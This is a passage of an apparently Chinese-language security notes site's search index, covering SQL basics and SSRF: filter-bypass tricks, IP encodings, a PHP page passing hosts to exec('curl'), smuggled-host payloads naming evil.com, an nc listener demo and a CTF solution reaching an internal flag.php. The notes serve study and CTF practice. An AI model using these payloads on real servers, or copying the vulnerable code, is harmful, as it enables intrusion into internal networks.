\"country\" \u5217\u4e2d\u9009\u53d6\u552f\u4e00\u4e0d\u540c\u7684\u503c\uff0c\u4e5f\u5c31\u662f\u53bb\u6389 \"country\" \u5217\u91cd\u590d\u503c\uff1a where\u5b50\u53e5\u652f\u6301\u7684\u8fd0\u7b97\u7b26 \u00b6 \u8fd0\u7b97\u7b26 \u63cf\u8ff0 = \u7b49\u4e8e <> \u4e0d\u7b49\u4e8e\u3002 \u6ce8\u91ca\uff1a \u5728 SQL \u7684\u4e00\u4e9b\u7248\u672c\u4e2d\uff0c\u8be5\u64cd\u4f5c\u7b26\u53ef\u88ab\u5199\u6210 != > \u5927\u4e8e < \u5c0f\u4e8e >= \u5927\u4e8e\u7b49\u4e8e <= \u5c0f\u4e8e\u7b49\u4e8e BETWEEN \u5728\u67d0\u4e2a\u8303\u56f4\u5185 LIKE \u641c\u7d22\u67d0\u79cd\u6a21\u5f0f IN \u6307\u5b9a\u9488\u5bf9\u67d0\u4e2a\u5217\u7684\u591a\u4e2a\u53ef\u80fd\u503c \u5176\u4e2d <>\uff0c between\uff0clike\uff0cin \u8981\u7075\u6d3b\u8fd0\u7528 \u4e00\u4e9b\u7279\u6b8a\u6761\u4ef6 \u00b6 1.\u7a7a\u503c\u5224\u65ad\uff1a is null 1 Select * from emp where comm is null; \u67e5\u8be2 emp \u8868\u4e2d comm \u5217\u4e2d\u7684\u7a7a\u503c\u3002 2.between and (\u5728 \u4e4b\u95f4\u7684\u503c) 1 Select * from emp where sal between 1500 and 3000 ; 3.In 1 Select * from emp where sal in (5000,3000,1500); \u67e5\u8be2 EMP \u8868 SAL \u5217\u4e2d\u7b49\u4e8e 5000\uff0c3000\uff0c1500 \u7684\u503c\u3002 4.like Like\u6a21\u7cca\u67e5\u8be2 1 Select * from emp where ename like 'M%'; \u67e5\u8be2 EMP \u8868\u4e2d Ename \u5217\u4e2d\u6709 M \u7684\u503c\uff0cM \u4e3a\u8981\u67e5\u8be2\u5185\u5bb9\u4e2d\u7684\u6a21\u7cca\u4fe1\u606f\u3002 % \u8868\u793a\u591a\u4e2a\u5b57\u503c\uff0c _ \u4e0b\u5212\u7ebf\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff1b M% : \u4e3a\u80fd\u914d\u7b26\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u8868\u793a\u7684\u610f\u601d\u4e3a\u6a21\u7cca\u67e5\u8be2\u4fe1\u606f\u4e3a M \u5f00\u5934\u7684\u3002 %M% : \u8868\u793a\u67e5\u8be2\u5305\u542bM\u7684\u6240\u6709\u5185\u5bb9\u3002 %M_ : \u8868\u793a\u67e5\u8be2\u4ee5M\u5728\u5012\u6570\u7b2c\u4e8c\u4f4d\u7684\u6240\u6709\u5185\u5bb9\u3002 \u4e0d\u5e26\u6bd4\u8f83\u8fd0\u7b97\u7b26\u7684 WHERE \u5b50\u53e5\uff1a(\u611f\u89c9\u5f88\u795e\u5947) \u00b6 WHERE \u5b50\u53e5\u5e76\u4e0d\u4e00\u5b9a\u5e26\u6bd4\u8f83\u8fd0\u7b97\u7b26\uff0c\u5f53\u4e0d\u5e26\u8fd0\u7b97\u7b26\u65f6\uff0c\u4f1a\u6267\u884c\u4e00\u4e2a\u9690\u5f0f\u8f6c\u6362\u3002\u5f53 0 \u65f6\u8f6c\u5316\u4e3a false\uff0c1 \u8f6c\u5316\u4e3a true\u3002\u4f8b\u5982\uff1a 1 SELECT studentNO FROM student WHERE 0 \u5219\u4f1a\u8fd4\u56de\u4e00\u4e2a\u7a7a\u96c6\uff0c\u56e0\u4e3a\u6bcf\u4e00\u884c\u8bb0\u5f55 WHERE \u90fd\u8fd4\u56de false\u3002 1 SELECT studentNO FROM student WHERE 1 \u8fd4\u56de student \u8868\u6240\u6709\u884c\u4e2d studentNO \u5217\u7684\u503c\u3002\u56e0\u4e3a\u6bcf\u4e00\u884c\u8bb0\u5f55 WHERE \u90fd\u8fd4\u56de true\u3002 order by \u00b6 ORDER BY \u5173\u952e\u5b57\u7528\u4e8e\u5bf9\u7ed3\u679c\u96c6\u6309\u7167\u4e00\u4e2a\u5217\u6216\u8005\u591a\u4e2a\u5217\u8fdb\u884c\u6392\u5e8f\u3002 ORDER BY \u5173\u952e\u5b57\u9ed8\u8ba4\u6309\u7167\u5347\u5e8f\u5bf9\u8bb0\u5f55\u8fdb\u884c\u6392\u5e8f\u3002\u5982\u679c\u9700\u8981\u6309\u7167\u964d\u5e8f\u5bf9\u8bb0\u5f55\u8fdb\u884c\u6392\u5e8f\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528 DESC \u5173\u952e\u5b57\u3002","title":"SQL(\u7ed3\u6784\u5316\u67e5\u8be2\u8bed\u8a00)\u57fa\u672c\u77e5\u8bc6"},{"location":"web_sec/SQL/sql\u8bed\u53e5\u57fa\u672c\u77e5\u8bc6/#sql","text":"","title":"SQL(\u7ed3\u6784\u5316\u67e5\u8be2\u8bed\u8a00)\u57fa\u672c\u77e5\u8bc6"},{"location":"web_sec/SQL/sql\u8bed\u53e5\u57fa\u672c\u77e5\u8bc6/#select","text":"SELECT DISTINCT country FROM Websites; \u4ec5\u4ece \"Websites\" \u8868\u7684 \"country\" \u5217\u4e2d\u9009\u53d6\u552f\u4e00\u4e0d\u540c\u7684\u503c\uff0c\u4e5f\u5c31\u662f\u53bb\u6389 \"country\" \u5217\u91cd\u590d\u503c\uff1a","title":"select"},{"location":"web_sec/SQL/sql\u8bed\u53e5\u57fa\u672c\u77e5\u8bc6/#where","text":"\u8fd0\u7b97\u7b26 \u63cf\u8ff0 = \u7b49\u4e8e <> \u4e0d\u7b49\u4e8e\u3002 \u6ce8\u91ca\uff1a \u5728 SQL \u7684\u4e00\u4e9b\u7248\u672c\u4e2d\uff0c\u8be5\u64cd\u4f5c\u7b26\u53ef\u88ab\u5199\u6210 != > \u5927\u4e8e < \u5c0f\u4e8e >= \u5927\u4e8e\u7b49\u4e8e <= \u5c0f\u4e8e\u7b49\u4e8e BETWEEN \u5728\u67d0\u4e2a\u8303\u56f4\u5185 LIKE \u641c\u7d22\u67d0\u79cd\u6a21\u5f0f IN \u6307\u5b9a\u9488\u5bf9\u67d0\u4e2a\u5217\u7684\u591a\u4e2a\u53ef\u80fd\u503c \u5176\u4e2d <>\uff0c between\uff0clike\uff0cin \u8981\u7075\u6d3b\u8fd0\u7528","title":"where\u5b50\u53e5\u652f\u6301\u7684\u8fd0\u7b97\u7b26"},{"location":"web_sec/SQL/sql\u8bed\u53e5\u57fa\u672c\u77e5\u8bc6/#_1","text":"1.\u7a7a\u503c\u5224\u65ad\uff1a is null 1 Select * from emp where comm is null; \u67e5\u8be2 emp \u8868\u4e2d comm \u5217\u4e2d\u7684\u7a7a\u503c\u3002 2.between and (\u5728 \u4e4b\u95f4\u7684\u503c) 1 Select * from emp where sal between 1500 and 3000 ; 3.In 1 Select * from emp where sal in (5000,3000,1500); \u67e5\u8be2 EMP \u8868 SAL \u5217\u4e2d\u7b49\u4e8e 5000\uff0c3000\uff0c1500 \u7684\u503c\u3002 4.like Like\u6a21\u7cca\u67e5\u8be2 1 Select * from emp where ename like 'M%'; \u67e5\u8be2 EMP \u8868\u4e2d Ename \u5217\u4e2d\u6709 M \u7684\u503c\uff0cM \u4e3a\u8981\u67e5\u8be2\u5185\u5bb9\u4e2d\u7684\u6a21\u7cca\u4fe1\u606f\u3002 % \u8868\u793a\u591a\u4e2a\u5b57\u503c\uff0c _ \u4e0b\u5212\u7ebf\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff1b M% : \u4e3a\u80fd\u914d\u7b26\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u8868\u793a\u7684\u610f\u601d\u4e3a\u6a21\u7cca\u67e5\u8be2\u4fe1\u606f\u4e3a M \u5f00\u5934\u7684\u3002 %M% : \u8868\u793a\u67e5\u8be2\u5305\u542bM\u7684\u6240\u6709\u5185\u5bb9\u3002 %M_ : \u8868\u793a\u67e5\u8be2\u4ee5M\u5728\u5012\u6570\u7b2c\u4e8c\u4f4d\u7684\u6240\u6709\u5185\u5bb9\u3002","title":"\u4e00\u4e9b\u7279\u6b8a\u6761\u4ef6"},{"location":"web_sec/SQL/sql\u8bed\u53e5\u57fa\u672c\u77e5\u8bc6/#where_1","text":"WHERE \u5b50\u53e5\u5e76\u4e0d\u4e00\u5b9a\u5e26\u6bd4\u8f83\u8fd0\u7b97\u7b26\uff0c\u5f53\u4e0d\u5e26\u8fd0\u7b97\u7b26\u65f6\uff0c\u4f1a\u6267\u884c\u4e00\u4e2a\u9690\u5f0f\u8f6c\u6362\u3002\u5f53 0 \u65f6\u8f6c\u5316\u4e3a false\uff0c1 \u8f6c\u5316\u4e3a true\u3002\u4f8b\u5982\uff1a 1 SELECT studentNO FROM student WHERE 0 \u5219\u4f1a\u8fd4\u56de\u4e00\u4e2a\u7a7a\u96c6\uff0c\u56e0\u4e3a\u6bcf\u4e00\u884c\u8bb0\u5f55 WHERE \u90fd\u8fd4\u56de false\u3002 1 SELECT studentNO FROM student WHERE 1 \u8fd4\u56de student \u8868\u6240\u6709\u884c\u4e2d studentNO \u5217\u7684\u503c\u3002\u56e0\u4e3a\u6bcf\u4e00\u884c\u8bb0\u5f55 WHERE \u90fd\u8fd4\u56de true\u3002","title":"\u4e0d\u5e26\u6bd4\u8f83\u8fd0\u7b97\u7b26\u7684 WHERE \u5b50\u53e5\uff1a(\u611f\u89c9\u5f88\u795e\u5947)"},{"location":"web_sec/SQL/sql\u8bed\u53e5\u57fa\u672c\u77e5\u8bc6/#order-by","text":"ORDER BY \u5173\u952e\u5b57\u7528\u4e8e\u5bf9\u7ed3\u679c\u96c6\u6309\u7167\u4e00\u4e2a\u5217\u6216\u8005\u591a\u4e2a\u5217\u8fdb\u884c\u6392\u5e8f\u3002 ORDER BY \u5173\u952e\u5b57\u9ed8\u8ba4\u6309\u7167\u5347\u5e8f\u5bf9\u8bb0\u5f55\u8fdb\u884c\u6392\u5e8f\u3002\u5982\u679c\u9700\u8981\u6309\u7167\u964d\u5e8f\u5bf9\u8bb0\u5f55\u8fdb\u884c\u6392\u5e8f\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528 DESC \u5173\u952e\u5b57\u3002","title":"order by"},{"location":"web_sec/SSRF/","text":"SSRF\u53c2\u8003 \u00b6 bypassing SSRF protection Intro to SSRF","title":"SSRF\u53c2\u8003"},{"location":"web_sec/SSRF/#ssrf","text":"bypassing SSRF protection Intro to SSRF","title":"SSRF\u53c2\u8003"},{"location":"web_sec/SSRF/bypassing/","text":"\u7ed5\u8fc7SSRF\u7684\u9632\u5fa1 \u00b6 \u7ed5\u8fc7\u6280\u5de7\uff1a 1\u3001@\u7b26 2\u3001\u5404\u79cdIP\u5730\u5740\u7684\u8fdb\u5236\u8f6c\u6362 3\u3001\u8df3\u8f6c 4\u3001\u77ed\u5730\u5740 5\u3001\u7279\u6b8a\u57df\u540d xxxx.xip.io 6\u3001DNS\u89e3\u6790(\u6bd4\u8f83\u82db\u523b)\uff0c\u5982DNS\u91cd\u7ed1\u5b9a 7\u3001[::] 8\u3001\u5229\u7528\u3002 9\u3001\u5229\u7528curl\u8ddfparse_url\u51fd\u6570\u7684\u5dee\u5f02\u7ed5\u8fc7 \u53c2\u8003\u81ea decade bypassing Blacklist \u00b6 \u6b3a\u9a97\u670d\u52a1\u5668 \u00b6 \u8ba9\u670d\u52a1\u5668\u901a\u8fc7\u4e00\u4e2aURL\u8bf7\u6c42\u4e00\u4e2a\u6587\u4ef6\u5305\u542b\u5982\u4e0b\u5185\u5bb9 1 <?php header ( \u201clocation : http :// 127.0 . 0.1 \"); ?> \u8fd9\u65f6\u5019\u670d\u52a1\u5668\u8bfb\u53d6\u6587\u4ef6\u4e4b\u540e\u5c31\u4f1a\u91cd\u5b9a\u5411\u4e86 \u4fee\u6539DNS\u8bb0\u5f55 \u00b6 \u4fee\u6539A/AAAA\u8bb0\u5f55\uff0c\u5f53\u670d\u52a1\u5668\u8bf7\u6c42 http://attacker.com \u65f6\u53d8\u6210\u4e86\u8bbf\u95ee 127.0.0.1 \u4f7f\u7528ipv6\u5730\u5740 \u00b6 \u8f6c\u6362\u7f16\u7801 \u00b6 hex encoding 1 127.0.0.1 translates to 0x7f.0x0.0x0.0x1 Octal encoding 1 127.0.0.1 translates to 0177.0.0.01 Dword encoding \u5c06 http://127.0.0.1 \u8f6c\u5316\u4e3a http://2130706433 \u5c31\u884c\u4e86 So what is 127.0.0.1 in dword? It\u2019s the answer for 127 256\u00b3+0 256\u00b2+0 256\u00b9+1 256\u2070, which is 2130706433. (Whip out that scientific calculator! Or just use a decimal to binary calculator.) Meaning that if you type in http://2130706433 instead of http://127.0.0.1 , it would still be understood! Pretty cool right? URL encoding For example, the word \u201clocalhost\u201d can be represented with its URL encoded equivalent, \u201c%6c%6f%63%61%6c%68%6f%73%74\u201d. So when a server is blocking requests to internal hostnames such as \u201clocalhost\u201d, try it\u2019s URL encoded equivalent! \u5c06localhost\u8fdb\u884cURL\u7f16\u7801 Mixed Encoding 1 127.0.0.1 translates to 0177.0.0.0x1","title":"\u7ed5\u8fc7SSRF\u7684\u9632\u5fa1"},{"location":"web_sec/SSRF/bypassing/#ssrf","text":"\u7ed5\u8fc7\u6280\u5de7\uff1a 1\u3001@\u7b26 2\u3001\u5404\u79cdIP\u5730\u5740\u7684\u8fdb\u5236\u8f6c\u6362 3\u3001\u8df3\u8f6c 4\u3001\u77ed\u5730\u5740 5\u3001\u7279\u6b8a\u57df\u540d xxxx.xip.io 6\u3001DNS\u89e3\u6790(\u6bd4\u8f83\u82db\u523b)\uff0c\u5982DNS\u91cd\u7ed1\u5b9a 7\u3001[::] 8\u3001\u5229\u7528\u3002 9\u3001\u5229\u7528curl\u8ddfparse_url\u51fd\u6570\u7684\u5dee\u5f02\u7ed5\u8fc7 \u53c2\u8003\u81ea decade","title":"\u7ed5\u8fc7SSRF\u7684\u9632\u5fa1"},{"location":"web_sec/SSRF/bypassing/#bypassing-blacklist","text":"","title":"bypassing Blacklist"},{"location":"web_sec/SSRF/bypassing/#_1","text":"\u8ba9\u670d\u52a1\u5668\u901a\u8fc7\u4e00\u4e2aURL\u8bf7\u6c42\u4e00\u4e2a\u6587\u4ef6\u5305\u542b\u5982\u4e0b\u5185\u5bb9 1 <?php header ( \u201clocation : http :// 127.0 . 0.1 \"); ?> \u8fd9\u65f6\u5019\u670d\u52a1\u5668\u8bfb\u53d6\u6587\u4ef6\u4e4b\u540e\u5c31\u4f1a\u91cd\u5b9a\u5411\u4e86","title":"\u6b3a\u9a97\u670d\u52a1\u5668"},{"location":"web_sec/SSRF/bypassing/#dns","text":"\u4fee\u6539A/AAAA\u8bb0\u5f55\uff0c\u5f53\u670d\u52a1\u5668\u8bf7\u6c42 http://attacker.com \u65f6\u53d8\u6210\u4e86\u8bbf\u95ee 127.0.0.1","title":"\u4fee\u6539DNS\u8bb0\u5f55"},{"location":"web_sec/SSRF/bypassing/#ipv6","text":"","title":"\u4f7f\u7528ipv6\u5730\u5740"},{"location":"web_sec/SSRF/bypassing/#_2","text":"hex encoding 1 127.0.0.1 translates to 0x7f.0x0.0x0.0x1 Octal encoding 1 127.0.0.1 translates to 0177.0.0.01 Dword encoding \u5c06 http://127.0.0.1 \u8f6c\u5316\u4e3a http://2130706433 \u5c31\u884c\u4e86 So what is 127.0.0.1 in dword? It\u2019s the answer for 127 256\u00b3+0 256\u00b2+0 256\u00b9+1 256\u2070, which is 2130706433. (Whip out that scientific calculator! Or just use a decimal to binary calculator.) Meaning that if you type in http://2130706433 instead of http://127.0.0.1 , it would still be understood! Pretty cool right? URL encoding For example, the word \u201clocalhost\u201d can be represented with its URL encoded equivalent, \u201c%6c%6f%63%61%6c%68%6f%73%74\u201d. So when a server is blocking requests to internal hostnames such as \u201clocalhost\u201d, try it\u2019s URL encoded equivalent! \u5c06localhost\u8fdb\u884cURL\u7f16\u7801 Mixed Encoding 1 127.0.0.1 translates to 0177.0.0.0x1","title":"\u8f6c\u6362\u7f16\u7801"},{"location":"web_sec/SSRF/ssrftrick/","text":"ssrf\u4e2d\u7684trick \u00b6 url\u89e3\u6790 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 <?php $url = $_GET [ 'url' ]; echo \"Argument: \" . $url . \" \\n \" ; if ( filter_var ( $url , FILTER_VALIDATE_URL )) { $r = parse_url ( $url ); var_dump ( $r ); if ( preg_match ( '/skysec\\.top$/' , $r [ 'host' ])) { exec ( 'curl -v -s \"' . $r [ 'host' ] . '\"' , $a ); } else { echo \"Error: Host not allowed\" ; } } else { echo \"Error: Invalid URL\" ; } ?> 1.filter_var\u5bf9url\u8fdb\u884ccheck 2.parse_url\u83b7\u53d6url\u7684host 3.\u5bf9host\u8fdb\u884c\u6b63\u5219\u5339\u914d\uff0c\u5224\u65ad\u662f\u5426\u4ee5skysec.top\u7ed3\u5c3e payload 1 2 3 http://localhost/web/test/22.php?url=0://evil.com:80,skysec.top:80/ \u6216 http://localhost/web/test/22.php?url=0://evil.com:23333;skysec.top:80/ \u5f53\u4f7f\u7528\u4e86exec()\u51fd\u6570,\u4f8b\u5982\u6837\u9898\u4ee3\u7801\u4e2d exec('curl -v -s \"'.$r['host'].'\"', $a); \u65f6 \u53ef\u4ee5\u4f7f\u7528 1 http://localhost/web/test/22.php?url=0://evil$skysec.top \u8fd9\u6837\u90fd\u53ef\u4ee5\u7ed5\u8fc7\u68c0\u6d4b\uff0c\u8fbe\u5230\u8bf7\u6c42\u4efb\u610fip\uff0c\u4efb\u610f\u7aef\u53e3\u7684\u76ee\u7684 \u4e0d\u59a8\u6d4b\u8bd5\uff1a \u6211\u4eec\u5c06\u4e0a\u8ff0\u4ee3\u7801\u653e\u5728\u81ea\u5df1\u7684vps\u4e0a\uff1a 1.\u76d1\u542c23333\u7aef\u53e3\uff1a 1 2 root@ubuntu-512mb-sfo2-01:~# nc -l -vv -p 23333 Listening on [0.0.0.0] (family 0, port 23333) \u8bbf\u95ee 1 http://vps_ip/testsky/index.php?url=0://vps_ip:23333;skysec.top:80/ \u53ef\u4ee5\u5728\u76d1\u542c\u4e2d\u6536\u5230\uff1a 1 2 3 4 5 Connection from [vps_ip] port 23333 [tcp/*] accepted (family 2, sport 37996) GET / HTTP/1.1 Host: vps_ip:23333 User-Agent: curl/7.47.0 Accept: */* \u53c2\u8003 \u00b6 Some trick in ssrf and unserialize()","title":"ssrf\u4e2d\u7684trick"},{"location":"web_sec/SSRF/ssrftrick/#ssrftrick","text":"","title":"ssrf\u4e2d\u7684trick"},{"location":"web_sec/SSRF/ssrftrick/#url","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 <?php $url = $_GET [ 'url' ]; echo \"Argument: \" . $url . \" \\n \" ; if ( filter_var ( $url , FILTER_VALIDATE_URL )) { $r = parse_url ( $url ); var_dump ( $r ); if ( preg_match ( '/skysec\\.top$/' , $r [ 'host' ])) { exec ( 'curl -v -s \"' . $r [ 'host' ] . '\"' , $a ); } else { echo \"Error: Host not allowed\" ; } } else { echo \"Error: Invalid URL\" ; } ?> 1.filter_var\u5bf9url\u8fdb\u884ccheck 2.parse_url\u83b7\u53d6url\u7684host 3.\u5bf9host\u8fdb\u884c\u6b63\u5219\u5339\u914d\uff0c\u5224\u65ad\u662f\u5426\u4ee5skysec.top\u7ed3\u5c3e payload 1 2 3 http://localhost/web/test/22.php?url=0://evil.com:80,skysec.top:80/ \u6216 http://localhost/web/test/22.php?url=0://evil.com:23333;skysec.top:80/ \u5f53\u4f7f\u7528\u4e86exec()\u51fd\u6570,\u4f8b\u5982\u6837\u9898\u4ee3\u7801\u4e2d exec('curl -v -s \"'.$r['host'].'\"', $a); \u65f6 \u53ef\u4ee5\u4f7f\u7528 1 http://localhost/web/test/22.php?url=0://evil$skysec.top \u8fd9\u6837\u90fd\u53ef\u4ee5\u7ed5\u8fc7\u68c0\u6d4b\uff0c\u8fbe\u5230\u8bf7\u6c42\u4efb\u610fip\uff0c\u4efb\u610f\u7aef\u53e3\u7684\u76ee\u7684 \u4e0d\u59a8\u6d4b\u8bd5\uff1a \u6211\u4eec\u5c06\u4e0a\u8ff0\u4ee3\u7801\u653e\u5728\u81ea\u5df1\u7684vps\u4e0a\uff1a 1.\u76d1\u542c23333\u7aef\u53e3\uff1a 1 2 root@ubuntu-512mb-sfo2-01:~# nc -l -vv -p 23333 Listening on [0.0.0.0] (family 0, port 23333) \u8bbf\u95ee 1 http://vps_ip/testsky/index.php?url=0://vps_ip:23333;skysec.top:80/ \u53ef\u4ee5\u5728\u76d1\u542c\u4e2d\u6536\u5230\uff1a 1 2 3 4 5 Connection from [vps_ip] port 23333 [tcp/*] accepted (family 2, sport 37996) GET / HTTP/1.1 Host: vps_ip:23333 User-Agent: curl/7.47.0 Accept: */*","title":"url\u89e3\u6790"},{"location":"web_sec/SSRF/ssrftrick/#_1","text":"Some trick in ssrf and unserialize()","title":"\u53c2\u8003"},{"location":"web_sec/SSRF/\u5165\u7fa4\u9898/","text":"\u8bb0\u5f55\u4e00\u9053\u5165\u7fa4\u9898 \u00b6 \u6e90\u4ee3\u7801 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 <?php highlight_file ( __FILE__ ); function check_inner_ip ( $url ) { $match_result = preg_match ( '/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/' , $url ); if ( ! $match_result ) { die ( 'url fomat error' ); } try { $url_parse = parse_url ( $url ); } catch ( Exception $e ) { die ( 'url fomat error' ); return false ; } $hostname = $url_parse [ 'host' ]; $ip = gethostbyname ( $hostname ); $int_ip = ip2long ( $ip ); return ip2long ( '127.0.0.0' ) >> 24 == $int_ip >> 24 || ip2long ( '10.0.0.0' ) >> 24 == $int_ip >> 24 || ip2long ( '172.16.0.0' ) >> 20 == $int_ip >> 20 || ip2long ( '192.168.0.0' ) >> 16 == $int_ip >> 16 ; } function safe_request_url ( $url ) { if ( check_inner_ip ( $url )) { echo $url . ' is inner ip' ; } else { $ch = curl_init (); curl_setopt ( $ch , CURLOPT_URL , $url ); curl_setopt ( $ch , CURLOPT_RETURNTRANSFER , 1 ); curl_setopt ( $ch , CURLOPT_HEADER , 0 ); $output = curl_exec ( $ch ); $result_info = curl_getinfo ( $ch ); if ( $result_info [ 'redirect_url' ]) { safe_request_url ( $result_info [ 'redirect_url' ]); } curl_close ( $ch ); var_dump ( $output ); } } $url = $_GET [ 'url' ]; if ( ! empty ( $url )){ safe_request_url ( $url ); } ?> \u610f\u601d\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 http|https|gopher|dict \u56db\u79cd\u534f\u8bae\u8fdb\u884cCurl\u64cd\u4f5c\uff0c\u5e76\u4e14\u63a2\u6d4b\u5230\u7684\u5185\u5bb9\u4f1a\u901a\u8fc7 var_dump($output); \u6253\u5370\u51fa\u6765\uff0c\u4f46\u662f\u5b83\u4f1a\u5bf9\u6211\u4eec\u63a2\u6d4b\u7684ip\u5730\u5740\u8fdb\u884ccheck\uff0c\u770b\u662f\u5426\u4e3a\u5185\u7f51\u5730\u5740 \u4e24\u4e2apayload 1 2 payload1: ?url=http://127.0.0.1./flag.php payload2: ?url=http://@127.0.0.1:80@baidu.com/flag.php \u53c2\u8003 \u00b6 \u67d0\u5165\u7fa4\u9898\u89e3\u9898\u8bb0\u5f55","title":"\u8bb0\u5f55\u4e00\u9053\u5165\u7fa4\u9898"},{"location":"web_sec/SSRF/\u5165\u7fa4\u9898/#_1","text":"","title":"\u8bb0\u5f55\u4e00\u9053\u5165\u7fa4\u9898"},{"location":"web_sec/SSRF/\u5165\u7fa4\u9898/#_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 <?php highlight_file ( __FILE__ ); function check_inner_ip ( $url ) { $match_result = preg_match ( '/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/' , $url ); if ( ! $match_result ) { die ( 'url fomat error' ); } try { $url_parse = parse_url ( $url ); } catch ( Exception $e ) { die ( 'url fomat error' ); return false ; } $hostname = $url_parse [ 'host' ]; $ip = gethostbyname ( $hostname ); $int_ip = ip2long ( $ip ); return ip2long ( '127.0.0.0' ) >> 24 == $int_ip >> 24 || ip2long ( '10.0.0.0' ) >> 24 == $int_ip >> 24 || ip2long ( '172.16.0.0' ) >> 20 == $int_ip >> 20 || ip2long ( '192.168.0.0' ) >> 16 == $int_ip >> 16 ; } function safe_request_url ( $url ) { if ( check_inner_ip ( $url )) { echo $url . ' is inner ip' ; } else { $ch = curl_init (); curl_setopt ( $ch , CURLOPT_URL , $url ); curl_setopt ( $ch , CURLOPT_RETURNTRANSFER , 1 ); curl_setopt ( $ch , CURLOPT_HEADER , 0 ); $output = curl_exec ( $ch ); $result_info = curl_getinfo ( $ch ); if ( $result_info [ 'redirect_url' ]) { safe_request_url ( $result_info [ 'redirect_url' ]); } curl_close ( $ch ); var_dump ( $output ); } } $url = $_GET [ 'url' ]; if ( ! empty ( $url )){ safe_request_url ( $url ); } ?> \u610f\u601d\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 http|https|gopher|dict \u56db\u79cd\u534f\u8bae\u8fdb\u884cCurl\u64cd\u4f5c\uff0c\u5e76\u4e14\u63a2\u6d4b\u5230\u7684\u5185\u5bb9\u4f1a\u901a\u8fc7 var_dump($output); \u6253\u5370\u51fa\u6765\uff0c\u4f46\u662f\u5b83\u4f1a\u5bf9\u6211\u4eec\u63a2\u6d4b\u7684ip\u5730\u5740\u8fdb\u884ccheck\uff0c\u770b\u662f\u5426\u4e3a\u5185\u7f51\u5730\u5740 \u4e24\u4e2apayload 1 2 payload1: ?url=http://127.0.0.1./flag.php payload2: ?url=http://@127.0.0.1:80@baidu.com/flag.php","title":"\u6e90\u4ee3\u7801"},{"location":"web_sec/SSRF/\u5165\u7fa4\u9898/#_3","text":"\u67d0\u5165\u7fa4\u9898\u89e3\u9898\u8bb0\u5f55","title":"\u53c2\u8003"},{"location":"web_sec/SSRF/\u9605\u8bfbctfwiki\u6458\u5f55\u7684/","text":"\u9605\u8bfbctfwiki\u6458\u5f55\u7684 \u00b6 ssrf\u5e38\u89c1\u7684\u540e\u7aef\u5b9e\u73b0 \u00b6 1 2 3 4 5 6 7 8 9 10 <?php if ( isset ( $_POST [ 'url' ])) { $content = file_get_contents ( $_POST [ 'url' ]); $filename = './images/' . rand () . ';img1.jpg' ; file_put_contents ( $filename , $content ); echo $_POST [ 'url' ]; $img = \"<img src= \\\" \" . $filename . \" \\\" />\" ; } echo $img ; ?> file_get_contents \u51fd\u6570\u4f1a\u5305\u542burl\u4e2d\u7684\u6587\u4ef6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 <?php function GetFile ( $host , $port , $link ) { $fp = fsockopen ( $host , intval ( $port ), $errno , $errstr , 30 ); if ( ! $fp ) { echo \" $errstr (error number $errno ) \\n \" ; } else { $out = \"GET $link HTTP/1.1 \\r\\n \" ; $out .= \"Host: $host\\r\\n \" ; $out .= \"Connection: Close \\r\\n\\r\\n \" ; $out .= \" \\r\\n \" ; fwrite ( $fp , $out ); $contents = '' ; while ( ! feof ( $fp )) { $contents .= fgets ( $fp , 1024 ); } fclose ( $fp ); return $contents ; } } ?> fsockopen \u51fd\u6570\u4f1a\u4f7f\u7528socket\u5efa\u7acb\u4e00\u4e2a\u8fde\u63a5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 <?php if ( isset ( $_POST [ 'url' ])) { $link = $_POST [ 'url' ]; $curlobj = curl_init (); curl_setopt ( $curlobj , CURLOPT_POST , 0 ); curl_setopt ( $curlobj , CURLOPT_URL , $link ); curl_setopt ( $curlobj , CURLOPT_RETURNTRANSFER , 1 ); $result = curl_exec ( $curlobj ); curl_close ( $curlobj ); $filename = './curled/' . rand () . '.txt' ; file_put_contents ( $filename , $result ); echo $result ; } ?> \u7ecf\u5e38\u53ef\u4ee5\u89c1\u5230\u8fd9\u6837\u7684\u4ee3\u7801\uff0c\u4e0d\u8fc7\u8fd9\u4e2acurl\u548cLinux bash\u4e0a\u7684curl\u6709\u70b9\u4e0d\u540c","title":"\u9605\u8bfbctfwiki\u6458\u5f55\u7684"},{"location":"web_sec/SSRF/\u9605\u8bfbctfwiki\u6458\u5f55\u7684/#ctfwiki","text":"","title":"\u9605\u8bfbctfwiki\u6458\u5f55\u7684"},{"location":"web_sec/SSRF/\u9605\u8bfbctfwiki\u6458\u5f55\u7684/#ssrf","text":"1 2 3 4 5 6 7 8 9 10 <?php if ( isset ( $_POST [ 'url' ])) { $content = file_get_contents ( $_POST [ 'url' ]); $filename = './images/' . rand () . ';img1.jpg' ; file_put_contents ( $filename , $content ); echo $_POST [ 'url' ]; $img = \"<img src= \\\" \" . $filename . \" \\\" />\" ; } echo $img ; ?> file_get_contents \u51fd\u6570\u4f1a\u5305\u542burl\u4e2d\u7684\u6587\u4ef6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 <?php function GetFile ( $host , $port , $link ) { $fp = fsockopen ( $host , intval ( $port ), $errno , $errstr , 30 ); if ( ! $fp ) { echo \" $errstr (error number $errno ) \\n \" ; } else { $out = \"GET $link HTTP/1.1 \\r\\n \" ; $out .= \"Host: $host\\r\\n \" ; $out .= \"Connection: Close \\r\\n\\r\\n \" ; $out .= \" \\r\\n \" 